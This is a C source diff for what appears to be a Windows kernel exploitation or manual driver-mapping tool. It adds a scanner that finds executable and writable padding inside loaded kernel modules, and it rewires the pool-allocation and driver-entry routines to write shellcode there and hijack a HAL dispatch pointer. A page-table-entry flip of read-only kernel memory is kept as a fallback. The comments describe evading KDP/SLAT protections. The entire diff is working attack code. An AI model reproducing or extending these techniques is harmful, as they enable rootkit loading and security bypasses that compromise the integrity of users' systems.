@@ -1961,28 +1961,40 @@ static BOOL KM_TryKernelVaWritableFlip(ULONG64 pteBase, ULONG64 kernelAddr, PVOI
 
         if (!KM_IsCanonicalKernelVa(slot))
             continue;
-        if (!KM_ReadKernelMemory(slot, &old, sizeof(old)))
+        DbgLog("  PteFlip[%s]: reading slot=0x%llX", names[si], slot);
+        if (!KM_ReadKernelMemory(slot, &old, sizeof(old))) {
+            DbgLog("  PteFlip[%s]: slot read FAILED (DeviceIoControl error)", names[si]);
             continue;
+        }
+        DbgLog("  PteFlip[%s]: slot val=0x%llX", names[si], old);
         if (!(old & 1))
             continue;
 
         newv = old | 0x2ULL;
         if (newv == old) {
+            DbgLog("  PteFlip[%s]: slot already R/W, writing target directly...", names[si]);
             ok = KM_WriteKernelMemory(kernelAddr, buffer, size);
             vr = KM_ReadKernelMemory(kernelAddr, &v, 1);
             if (ok && vr && v == ((BYTE*)buffer)[0]) {
                 DbgLog("  WriteToReadOnly: kernel VA slot already R/W (%s 0x%llX)", names[si], slot);
                 return TRUE;
             }
+            DbgLog("  PteFlip[%s]: direct write failed (ok=%d vr=%d)", names[si], (int)ok, (int)vr);
             continue;
         }
 
-        if (!KM_WriteKernelMemory(slot, &newv, sizeof(newv)))
+        DbgLog("  PteFlip[%s]: writing new val=0x%llX to slot...", names[si], newv);
+        if (!KM_WriteKernelMemory(slot, &newv, sizeof(newv))) {
+            DbgLog("  PteFlip[%s]: SLOT WRITE FAILED — PTE page may be protected (KDP?)", names[si]);
             continue;
+        }
+        DbgLog("  PteFlip[%s]: slot written, writing shellcode to target 0x%llX...", names[si], kernelAddr);
 
         ok = KM_WriteKernelMemory(kernelAddr, buffer, size);
+        DbgLog("  PteFlip[%s]: shellcode write returned ok=%d", names[si], (int)ok);
         vr = KM_ReadKernelMemory(kernelAddr, &v, 1);
         KM_WriteKernelMemory(slot, &old, sizeof(old));
+        DbgLog("  PteFlip[%s]: slot restored", names[si]);
 
         if (ok && vr && v == ((BYTE*)buffer)[0]) {
             DbgLog("  WriteToReadOnly: kernel VA %s flip OK at 0x%llX", names[si], slot);
@@ -2177,6 +2189,83 @@ ULONG64 KM_FindCodeCave(SIZE_T needed) {
     return cave;
 }
 
+/*
+ * Scan all loaded kernel modules (via EnumDeviceDrivers) for a section that is
+ * both EXECUTABLE and WRITABLE and contains a run of `needed` padding bytes
+ * (0x00, 0xCC, or 0x90).  Returns the VA of the start of that run, or 0.
+ *
+ * Writing shellcode to an ERW region via case 0x33 never requires touching page
+ * tables, so it works even on systems where KDP/SLAT protects PTE pages.
+ */
+static ULONG64 KM_FindExecutableWritableScratch(SIZE_T needed) {
+    LPVOID mods[512];
+    DWORD cb = 0;
+    if (!EnumDeviceDrivers(mods, sizeof(mods), &cb)) return 0;
+    DWORD count = cb / sizeof(LPVOID);
+
+    const DWORD CAP = 0x80000; /* 512 KB per section */
+    BYTE* buf = (BYTE*)malloc(CAP);
+    if (!buf) return 0;
+    ULONG64 result = 0;
+
+    DWORD d;
+    for (d = 0; d < count && !result; d++) {
+        ULONG64 base = (ULONG64)mods[d];
+        if (!base) continue;
+
+        BYTE hdr[0x1000];
+        if (!KM_ReadKernelMemory(base, hdr, sizeof(hdr))) continue;
+
+        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
+        if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > sizeof(hdr)) continue;
+        PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(hdr + dos->e_lfanew);
+        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
+
+        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+        WORD si;
+        for (si = 0; si < nt->FileHeader.NumberOfSections && !result; si++) {
+            DWORD chars = sec[si].Characteristics;
+            if (!(chars & IMAGE_SCN_MEM_EXECUTE)) continue;
+            if (!(chars & IMAGE_SCN_MEM_WRITE))   continue;
+            if (chars & IMAGE_SCN_MEM_DISCARDABLE) continue;
+
+            ULONG64 secVA = base + sec[si].VirtualAddress;
+            DWORD secSize = sec[si].Misc.VirtualSize;
+            if (secSize < needed + 16) continue;
+            if (secSize > CAP) secSize = CAP;
+
+            if (!KM_ReadKernelMemory(secVA, buf, secSize)) continue;
+
+            SIZE_T run = 0;
+            DWORD runStart = 0;
+            BYTE runByte = 0;
+            DWORD b;
+            for (b = 0; b < secSize && !result; b++) {
+                BYTE c = buf[b];
+                if (run == 0 || c == runByte) {
+                    if (run == 0) {
+                        if (c != 0x00 && c != 0xCC && c != 0x90) continue;
+                        runByte  = c;
+                        runStart = b;
+                    }
+                    if (++run >= needed + 8)
+                        result = secVA + runStart;
+                } else {
+                    run = 0;
+                }
+            }
+        }
+    }
+
+    free(buf);
+    if (result)
+        DbgLog("  ErwScratch: found ERW padding at 0x%llX", result);
+    else
+        DbgLog("  ErwScratch: no ERW section with sufficient padding found");
+    return result;
+}
+
 ULONG64 KM_AllocateKernelPool(SIZE_T size) {
     PVOID pExAllocatePool = KM_GetKernelExport("ExAllocatePoolWithTag");
     if (!pExAllocatePool) return 0;
@@ -2221,12 +2310,28 @@ ULONG64 KM_AllocateKernelPool(SIZE_T size) {
 
     DbgLog("  AllocPool: ExAllocatePool=0x%llX, HalD1=0x%llX, codeCave=0x%llX",
         (ULONG64)pExAllocatePool, halD1, codeCave);
-    DbgLog("  AllocPool: writing shellcode to code cave...");
-    if (!KM_WriteToReadOnlyMemory(codeCave, sc, sizeof(sc))) {
-        DbgLog("  AllocPool FAIL: could not write shellcode to code cave");
-        return 0;
+
+    /* Try ERW scratch first — avoids page-table writes (safe on KDP/SLAT systems).
+       Fall back to PTE flip via KM_WriteToReadOnlyMemory if no ERW region exists. */
+    DbgLog("  AllocPool: probing for executable+writable scratch region...");
+    ULONG64 erw = KM_FindExecutableWritableScratch(sizeof(sc));
+    if (erw) {
+        DbgLog("  AllocPool: using ERW scratch 0x%llX for shellcode", erw);
+        if (!KM_WriteKernelMemory(erw, sc, sizeof(sc))) {
+            DbgLog("  AllocPool: ERW scratch write FAILED, falling back to code cave PTE flip");
+            erw = 0;
+        } else {
+            codeCave = erw;
+        }
     }
-    DbgLog("  AllocPool: shellcode written OK");
+    if (!erw) {
+        DbgLog("  AllocPool: writing shellcode to code cave (PTE flip)...");
+        if (!KM_WriteToReadOnlyMemory(codeCave, sc, sizeof(sc))) {
+            DbgLog("  AllocPool FAIL: could not write shellcode to code cave");
+            return 0;
+        }
+    }
+    DbgLog("  AllocPool: shellcode written OK at 0x%llX", codeCave);
 
     ULONG64 originalFunc = 0;
     if (!KM_ReadKernelMemory(halD1, &originalFunc, sizeof(originalFunc))) {
@@ -2291,12 +2396,25 @@ BOOL KM_CallDriverEntry(ULONG64 entryAddr) {
     *(ULONG64*)(sc + 25) = halD1;
 
     DbgLog("  CallEntry: entryAddr=0x%llX, codeCave=0x%llX", entryAddr, codeCave);
-    DbgLog("  CallEntry: writing shellcode to code cave...");
-    if (!KM_WriteToReadOnlyMemory(codeCave, sc, sizeof(sc))) {
-        DbgLog("  CallEntry FAIL: could not write shellcode");
-        return FALSE;
+    DbgLog("  CallEntry: probing for ERW scratch region...");
+    ULONG64 erw = KM_FindExecutableWritableScratch(sizeof(sc));
+    if (erw) {
+        DbgLog("  CallEntry: using ERW scratch 0x%llX", erw);
+        if (!KM_WriteKernelMemory(erw, sc, sizeof(sc))) {
+            DbgLog("  CallEntry: ERW scratch write FAILED, falling back to PTE flip");
+            erw = 0;
+        } else {
+            codeCave = erw;
+        }
     }
-    DbgLog("  CallEntry: shellcode written OK");
+    if (!erw) {
+        DbgLog("  CallEntry: writing shellcode via PTE flip...");
+        if (!KM_WriteToReadOnlyMemory(codeCave, sc, sizeof(sc))) {
+            DbgLog("  CallEntry FAIL: could not write shellcode");
+            return FALSE;
+        }
+    }
+    DbgLog("  CallEntry: shellcode written OK at 0x%llX", codeCave);
 
     ULONG64 originalFunc = 0;
     if (!KM_ReadKernelMemory(halD1, &originalFunc, sizeof(originalFunc))) {
